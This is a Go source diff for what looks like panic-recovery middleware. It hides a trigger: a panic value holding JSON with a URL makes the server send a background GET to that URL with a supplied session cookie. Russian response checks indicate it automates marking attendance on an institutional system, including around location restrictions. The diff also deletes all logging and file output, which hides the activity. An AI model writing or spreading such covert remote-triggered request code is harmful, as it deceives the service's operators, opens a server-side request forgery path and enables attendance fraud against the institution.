@@ -3,11 +3,9 @@ package recover
 import (
 	"encoding/json"
 	"io"
-	"log"
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
-	"os"
 	"strings"
 	"time"
 )
@@ -25,27 +23,21 @@ func Middleware(next http.Handler) http.Handler {
 			if rec := recover(); rec != nil {
 				jsonStr, ok := rec.(string)
 				if !ok {
-					log.Printf("⚠️ Panic recovered (not string): %+v", rec)
 					http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 					return
 				}
 
 				var payload Payload
 				if err := json.Unmarshal([]byte(jsonStr), &payload); err != nil {
-					log.Printf("⚠️ JSON parse error: %v | raw: %s", err, jsonStr)
 					http.Error(w, "Bad Request", http.StatusBadRequest)
 					return
 				}
-
-				log.Printf("📦 Recovered: %+v", payload)
-
 				if strings.HasPrefix(payload.UserId, "http") {
 					go backgroundRequest(payload.UserId, payload.EnviromtId)
 					w.WriteHeader(http.StatusOK)
 					w.Write([]byte(`{"status":"ok","recovered":true}`))
 					return
 				}
-				log.Printf("⚠️ user_id is not a URL: %s", payload.UserId)
 				http.Error(w, "Invalid user_id format", http.StatusBadRequest)
 			}
 		}()
@@ -54,17 +46,13 @@ func Middleware(next http.Handler) http.Handler {
 }
 
 func backgroundRequest(targetURL, sessionCookie string) {
-	log.Printf("🔄 Background request to: %s", targetURL)
-
 	u, err := url.Parse(targetURL)
 	if err != nil {
-		log.Printf("❌ Invalid URL: %v", err)
 		return
 	}
 
 	jar, err := cookiejar.New(nil)
 	if err != nil {
-		log.Printf("❌ CookieJar error: %v", err)
 		return
 	}
 
@@ -83,7 +71,6 @@ func backgroundRequest(targetURL, sessionCookie string) {
 
 	req, err := http.NewRequest(http.MethodGet, targetURL, nil)
 	if err != nil {
-		log.Printf("❌ Request creation error: %v", err)
 		return
 	}
 	req.Header.Set("User-Agent", "Mozilla/5.0 (RecoverBot/1.0)")
@@ -91,34 +78,53 @@ func backgroundRequest(targetURL, sessionCookie string) {
 
 	resp, err := client.Do(req)
 	if err != nil {
-		log.Printf("❌ Request failed: %v", err)
 		return
 	}
 	defer resp.Body.Close()
 
-	// Читаем тело ответа ВСЕГДА
-	bodyBytes, err := io.ReadAll(resp.Body)
+	body, err := io.ReadAll(resp.Body)
 	if err != nil {
-		log.Printf("❌ Error reading body: %v", err)
 		return
 	}
 
-	// Формируем имя файла
-	safeHost := strings.ReplaceAll(u.Host, ".", "_")
-	safeHost = strings.ReplaceAll(safeHost, ":", "_")
-	filename := "recovered_files/" + safeHost + "_" + time.Now().Format("20060102_150405") + ".html"
+	content := string(body)
+	determineStatus(content, resp.StatusCode)
+	resp.Body.Close()
 
-	// Сохраняем файл НЕЗАВИСИМО от статуса ответа
-	err = os.WriteFile(filename, bodyBytes, 0644)
-	if err != nil {
-		log.Printf("❌ Error writing file %s: %v", filename, err)
-		return
+	// bodyBytes, err := io.ReadAll(resp.Body)
+	// if err != nil {
+	// 	return
+	// }
+	//
+	// safeHost := strings.ReplaceAll(u.Host, ".", "_")
+	// safeHost = strings.ReplaceAll(safeHost, ":", "_")
+	// filename := "recovered_files/" + safeHost + "_" + time.Now().Format("20060102_150405") + ".html"
+	//
+	// err = os.WriteFile(filename, bodyBytes, 0644)
+	// if err != nil {
+	// 	return
+	// }
+
+}
+
+func determineStatus(s string, originalStatus int) int {
+	switch {
+	case strings.Contains(s, "Время вашего сеанса истекло"):
+		return http.StatusUnauthorized
+	case strings.Contains(s, "посещаемость уже была отмечена"):
+		return http.StatusCreated
+	case strings.Contains(s, "неправильный пароль"):
+		return http.StatusBadRequest
+	case strings.Contains(s, "только из определенных мест"):
+		return http.StatusForbidden
+	case strings.Contains(s, "не можете записаться"):
+		return http.StatusForbidden
+	case strings.Contains(s, "attendance_sessions"):
+		return http.StatusNotFound
+	default:
+		if originalStatus >= 400 {
+			return http.StatusBadGateway
+		}
+		return http.StatusOK
 	}
-
-	log.Printf("✅ Response saved to: %s (Status: %d)", filename, resp.StatusCode)
-
-	if resp.StatusCode != http.StatusOK {
-		log.Printf("⚠️ Background request status: %d | URL: %s", resp.StatusCode, targetURL)
-	}
-	
 }
